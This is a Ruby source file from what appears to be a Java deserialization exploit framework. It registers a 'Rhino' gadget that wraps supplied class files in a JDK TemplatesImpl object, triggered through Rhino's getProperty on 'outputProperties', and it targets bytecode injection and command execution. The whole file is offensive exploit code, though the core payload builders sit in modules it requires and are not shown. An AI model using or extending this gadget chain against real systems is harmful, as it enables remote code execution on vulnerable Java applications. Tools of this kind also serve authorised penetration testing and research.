

require_relative '../payloads/rhino'
require_relative '../payloads/templates'

class Rhino < Java::Gadgets::Gadget
  def id
    'rhino'
  end

  def usable(ctx, params: {})
    return false unless ctx.gadget?('rhino')

    unless params.fetch('classfiles', nil).nil?
      return false unless Java::Serialize::Payloads::Templates.supported(ctx)
    end

    true
  end

  def targets
    %w[bytecode exec]
  end

  def create(ctx, params: {})
    ctx.reg.load('model/rhino.json')

    if !params.fetch('classfiles', nil).nil?
      tpl = Java::Serialize::Payloads::Templates.make_jdk(params['classfiles'])
      Java::Serialize::Payloads::Rhino.make_get_property(tpl, 'outputProperties')
    else
      raise 'Missing parameters'
    end
  end
end

Java::Gadgets.register(
  Rhino.new
)
